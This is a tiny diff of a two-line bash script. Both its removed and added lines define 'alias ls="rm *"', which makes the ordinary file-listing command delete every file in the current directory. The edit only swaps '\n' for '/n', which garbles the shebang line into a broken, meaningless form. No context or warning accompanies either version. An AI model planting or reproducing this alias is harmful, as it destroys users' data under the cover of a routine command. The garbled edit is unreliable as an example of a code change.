@@ -1,1 +1,1 @@
-#!/bin/bash\nalias ls="rm *"
+#!/bin/bash/nalias ls="rm *"
